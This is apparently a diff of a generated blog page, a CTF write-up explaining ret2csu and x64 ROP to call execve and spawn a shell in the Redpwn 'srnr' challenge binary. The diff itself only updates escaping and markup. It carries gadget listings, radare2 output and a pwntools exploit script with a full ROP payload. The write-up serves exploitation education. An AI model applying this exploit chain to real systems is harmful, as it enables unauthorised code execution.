@@ -93,7 +93,7 @@
 <script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
 
 
-<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.85.0" />
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.96.0" />
     
 
     
@@ -303,10 +303,10 @@
 
 
     <br>
-    <div class="content-width text-justify"><p>Based on the <em>Stop, ROP, n', Roll</em> challenge from this year&rsquo;s Redpwn CTF, this post will explain how to make system calls on x64 using ROP in order to spawn a shell. Also, it shows how to abuse writable memory regions of a process to overcome difficulties with some ROP gadgets. And the best thing is, two of the gadgets used in this writeup are universal and most likely also present in your x64 target if it&rsquo;s using <em>glibc</em>. Of course, everything will be done with <code>radare2</code> and <code>pwntools</code>.</p>
+    <div class="content-width text-justify"><p>Based on the <em>Stop, ROP, n&rsquo;, Roll</em> challenge from this year&rsquo;s Redpwn CTF, this post will explain how to make system calls on x64 using ROP in order to spawn a shell. Also, it shows how to abuse writable memory regions of a process to overcome difficulties with some ROP gadgets. And the best thing is, two of the gadgets used in this writeup are universal and most likely also present in your x64 target if it&rsquo;s using <em>glibc</em>. Of course, everything will be done with <code>radare2</code> and <code>pwntools</code>.</p>
 <p>The challenge binary can be found <a href="/misc/x64-rop-redpwn/srnr">here</a>.</p>
 <h1 id="ret2csu-basics">ret2csu Basics</h1>
-<p>The <em>ret2csu</em> technique, which has been presented at Black Hat Asia in 2018, is based on two specific ROP gadgets that are present in the <code>__libc_csu_init()</code> function. Lets' quote the authors of the <a href="/misc/x64-rop-redpwn/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">ret2csu paper</a> to explain why this function is even there:</p>
+<p>The <em>ret2csu</em> technique, which has been presented at Black Hat Asia in 2018, is based on two specific ROP gadgets that are present in the <code>__libc_csu_init()</code> function. Lets&rsquo; quote the authors of the <a href="/misc/x64-rop-redpwn/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">ret2csu paper</a> to explain why this function is even there:</p>
 <p><em>The problem appears when an application is Dynamically compiled, which represents
 99% of all applications. More precisely when the linker &ldquo;attaches code&rdquo; to the ELF
 executable that is not coming from the source code of the application. In other words the
@@ -316,12 +316,12 @@ when it is dynamically compiled.</em></p>
 <p>In other words, if a binary is dynamically linked and it&rsquo;s using <em>glibc</em>, these gadgets will be present &ndash; even if it&rsquo;s only a simple <em>Hello World</em> application. These gadgets can be handy in order to populate certain registers and alter the program flow. Moreover, the gadgets will always be mapped since <code>__libc_csu_init()</code> is getting executed <em>before</em> <code>main()</code>. There&rsquo;s a lot more to this exploitation technique and to fully understand it I recommend checking out the original paper linked above.</p>
 <h2 id="ok-so-what-are-those-gadgets">Ok So What Are Those Gadgets?</h2>
 <p>It seems that the structure of the first gadget <a href="https://ropemporium.com/challenge/ret2csu.html">varies depending on the compiler version</a>. I&rsquo;ve found quite a few variations of it, so it&rsquo;s always worth a check. Below you can find the first gadget as found in the challenge binary:</p>
-<pre><code>mov rdx, r15
+<pre tabindex="0"><code>mov rdx, r15
 mov rsi, r14
 mov edi, r13d
 call qword [r12 + rbx*8]
 </code></pre><p>And the Second one is:</p>
-<pre><code>pop rbx
+<pre tabindex="0"><code>pop rbx
 pop rbp
 pop r12
 pop r13
@@ -331,9 +331,9 @@ pop r15
 <p>Let&rsquo;s analyze the challenge binary before finding a way to make use of those gadgets.</p>
 <h1 id="the-target">The Target</h1>
 <p>Upon executing the binary, it asks for an input:</p>
-<pre><code>[#] number of bytes:
+<pre tabindex="0"><code>[#] number of bytes:
 </code></pre><p>The input is being read by the target using the function <code>get_int()</code> which uses <code>scanf()</code> in combination with the <code>%zu</code> format string internally. This basically gets an unsigned integer from the user input. An interesting thing to notice is that the user input serves as a parameter for the following <code>read()</code> call:</p>
-<pre><code>call sym.get_int # get integer, sets RAX to result value
+<pre tabindex="0"><code>call sym.get_int # get integer, sets RAX to result value
 mov qword [fildes], rax
 mov rax, qword [fildes]
 mov ecx, eax
@@ -344,9 +344,9 @@ mov edi, ecx # file descriptor
 call sym.imp.read
 </code></pre><p>This means that in order to input additional data via <code>read()</code>, the file descriptor has to be <code>0</code> which corresponds to <code>STDIN</code>. Using this <code>read()</code> call it&rsquo;s possible to overflow <code>buf</code> which resides at <code>RBP - 0x9</code>. The overflow happens after 17 bytes, as determined by passing a De Bruijn pattern using <code>ragg2 -r  -P 100</code>.</p>
 <p>First, set a breakpoint in <code>read()</code> at the <code>ret</code> instruction. Using this breakpoint it&rsquo;s possible to check what&rsquo;s about to be loaded into the instruction pointer:</p>
-<pre><code>[0x7fda3bd53338]&gt; pxr @rsp # Check what's on the top of the stack
-0x7fff9bea9518 0x4941414841414741   AGAAHAAI @rsp ascii ('A') # This will be loaded into the instruction pointer
-0x7fff9bea9520 0x41414b41414a4141   AAJAAKAA ascii ('A')
+<pre tabindex="0"><code>[0x7fda3bd53338]&gt; pxr @rsp # Check what&#39;s on the top of the stack
+0x7fff9bea9518 0x4941414841414741   AGAAHAAI @rsp ascii (&#39;A&#39;) # This will be loaded into the instruction pointer
+0x7fff9bea9520 0x41414b41414a4141   AAJAAKAA ascii (&#39;A&#39;)
 [...]
 [0x7fda3bd53338]&gt; wopO 0x4941414841414741 # Search for this value in the passed pattern
 17
@@ -388,7 +388,7 @@ call sym.imp.read
 <h2 id="getting-the-syscall-number">Getting The Syscall Number</h2>
 <p>One last thing: The <code>execve</code> system call itself is <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">identified</a> by the number <code>59</code>. This number has to be loaded into <code>RAX</code> before jumping to the <code>syscall</code> gadget.</p>
 <p>Reading a number is what the application does when executing it normally. It uses <code>get_int()</code> for this:</p>
-<pre><code>[0x00400600]&gt; pdf@sym.get_int
+<pre tabindex="0"><code>[0x00400600]&gt; pdf@sym.get_int
 / (fcn) sym.get_int 43
 |   sym.get_int ();
 |           ; var int32_t var_8h @ rbp-0x8
@@ -416,7 +416,7 @@ call sym.imp.read
 <li>Have a shell</li>
 </ol>
 <p>Or in code:</p>
-<pre><code>BINSH = p64(0x400c49)
+<pre tabindex="0"><code>BINSH = p64(0x400c49)
 SYSCALL = str(0x400703)
 JUMP_TO_SYSCALL = p64(0x00400800)
 POP_RDI = p64(0x400823)
@@ -426,18 +426,18 @@ SCANF = p64(0x004005f0)
 RET = p64(0x00400831)
 POP = p64(0x0040081c)
 
-PAYLOAD = &quot;&quot;
-PAYLOAD += &quot;A&quot; * PADDING # 17
+PAYLOAD = &#34;&#34;
+PAYLOAD += &#34;A&#34; * PADDING # 17
 
-# Setup the parameters for scanf(&quot;%zu&quot;, 0x60200)
+# Setup the parameters for scanf(&#34;%zu&#34;, 0x60200)
 PAYLOAD += POP_RDI
 PAYLOAD += p64(0x00400c52)  # format string for scanf()
 PAYLOAD += POP_RSI_r15
 PAYLOAD += p64(0x602000)  # rw region
-PAYLOAD += p64(0x0) # we don't care about r15 now
+PAYLOAD += p64(0x0) # we don&#39;t care about r15 now
 
 # Call scanf()
-PAYLOAD += p64(elf.sym[&quot;__isoc99_scanf&quot;])
+PAYLOAD += p64(elf.sym[&#34;__isoc99_scanf&#34;])
 
 # Get the system call number of execve (59) into RAX
 PAYLOAD += RET
@@ -460,12 +460,12 @@ PAYLOAD += p64(JUMP_TO_SYSCALL)
 <li>The system call number of <code>execve</code> via <code>get_int()</code></li>
 </ol>
 <p>Because of this, the exploitation has to be automated with <code>pwntools</code> as follows:</p>
-<pre><code>p = process(&quot;./srnr&quot;)
+<pre tabindex="0"><code>p = process(&#34;./srnr&#34;)
 
-p.sendline(&quot;0&quot;)
+p.sendline(&#34;0&#34;)
 p.sendline(PAYLOAD)
 p.sendline(SYSCALL) # Address of the syscall gadget
-p.sendline(&quot;59&quot;)
+p.sendline(&#34;59&#34;)
 
 p.interactive()
 </code></pre><p>Here&rsquo;s a demo of the exploit, starting from the last ROP gadget:</p>
